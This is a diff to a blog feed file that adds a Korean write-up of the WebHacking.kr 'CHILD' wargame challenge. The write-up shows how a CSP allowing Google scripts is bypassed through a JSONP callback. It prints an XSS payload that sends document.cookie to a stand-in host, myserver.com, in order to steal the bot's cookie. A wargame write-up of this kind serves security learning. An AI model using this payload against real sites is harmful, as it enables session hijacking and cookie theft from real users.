@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>WebHacking.kr CHILD Write up</title>
+      <link href="2021/07/11/webhackingkr-child-0711/"/>
+      <url>2021/07/11/webhackingkr-child-0711/</url>
+      
+        <content type="html"><![CDATA[<h3 id="인사말"><a href="#인사말" class="headerlink" title="인사말"></a>인사말</h3><p>이번엔 웹케알 새 문제 <code>CHILD</code> 문제에 대한 풀이에요~ 참고하시어 많은 도움이</p><p>되었으면 좋겠습니다 ㅎㅎ.</p><h3 id="분석"><a href="#분석" class="headerlink" title="분석"></a>분석</h3><p><img src="/img/post/webhackingkr_renew/challenge/child/page.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/child/page.png" srcset="data:image/png;base64,666" alt="img"></p><p>어라. 페이지가 이전 BABY 문제랑 흡사하네요? 이번에도 CSP 문제일까요~</p><p><img src="/img/post/webhackingkr_renew/challenge/child/csp1.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/child/csp1.png" srcset="data:image/png;base64,666" alt="img"></p><p>네 맞습니다. CSP 보안 정책이 적용되어있죠? 그런데 이전 문제랑은 조금 다른 정책이 있습니다.</p><p>script-src 리소스에 대해서 <code>https://*.google.com</code> 에서 오는 도메인은 허용하겠다라는 의미인데요.</p><p>그럼 google 도메인을 가지면서 callback으로 응답을 주는 사이트를 활용하면 되는것인데요</p><p>간단하게 <code>jsonp callback endpoint</code> 이라는 내용으로 검색을 해보시면 금방 알아채실거에요~</p><p>예시 사이트들을 알려드리자면 아래 사이트에 google을 포함한 다른 여러 사이트들의 jsonp callback을 알려주는 문서에요.</p><p><a href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt</a></p><p>허용된 <code>*.google.com</code> 도메인의 <code>jsonp callback</code>을 활용해 XSS를 발생시키고 이전 문제처럼 봇의 쿠키를 탈취하는 문제인데요~~</p><p>저는 <code>https://accounts.google.com/o/oauth2~~</code> 라는 주소를 사용할 거에요.</p><p>그럼 이번엔 페이로드를 어떻게 만들까? BABY 문제처럼 <code>script src</code> 리소스를 불러오는게 없기 때문에</p><p><code>inject</code> 파라미터에 다이렉트로 페이로드를 인젝션해줘야 하는데 <code>script src</code> 리소스를 불러오도록 만들면 되죠?</p><pre><code>`&amp;ltscript+src&amp;gt=&quot;https://accounts.google.com/o/oauth2/revoke?callback=location.href=&#39;https://myserver.com/?flag=&#39;+document.cookie;&quot;&amp;gt&amp;lt/script&amp;gt</code></pre><p>&amp;lt &amp;gt는 각각 &lt; &gt; 을 의미하며 이는.. 블로그 내 게시글 단순 필터링 목적으로 적용하니 참고하여 봐주세요!</p><p>무튼 <code>inject</code> 파라미터에 위 페이로드를 인젝션하게 되면 <code>myserver.com</code> 으로 redirection 이 되는것을 알 수 있어요~</p><p>이 점을 활용해서 report 페이지에 해당 페이로드를 send해서 봇이 사이트에 방문해주도록 만들면?</p><p>플래그 획 ~ 득 ~ 완 ~ 료 !@!</p><p><img src="/img/post/webhackingkr_renew/challenge/child/flag.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/child/flag.png" srcset="data:image/png;base64,666" alt="img"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Wargame </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> WebHacking.kr </tag>
+            
+            <tag> WebHacking </tag>
+            
+            <tag> Write up </tag>
+            
+            <tag> CSP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WebHacking.kr Baby Write up</title>
       <link href="2021/07/11/webhackingkr-baby-0710/"/>
       <url>2021/07/11/webhackingkr-baby-0710/</url>
@@ -1371,7 +1402,7 @@
       <link href="2020/11/21/poxctf-201121/"/>
       <url>2020/11/21/poxctf-201121/</url>
       
-        <content type="html"><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#115;&#x74;&#x6a;&#x68;&#x79;&#x65;&#x6f;&#x6e;&#64;&#x6b;&#x61;&#x6b;&#97;&#x6f;&#46;&#99;&#x6f;&#x6d;">&#115;&#x74;&#x6a;&#x68;&#x79;&#x65;&#x6f;&#x6e;&#64;&#x6b;&#x61;&#x6b;&#97;&#x6f;&#46;&#99;&#x6f;&#x6d;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content>
+        <content type="html"><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#115;&#x74;&#106;&#x68;&#121;&#101;&#111;&#110;&#x40;&#x6b;&#x61;&#107;&#x61;&#x6f;&#x2e;&#99;&#111;&#109;">&#115;&#x74;&#106;&#x68;&#121;&#101;&#111;&#110;&#x40;&#x6b;&#x61;&#107;&#x61;&#x6f;&#x2e;&#99;&#111;&#109;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content>
       
       
       <categories>
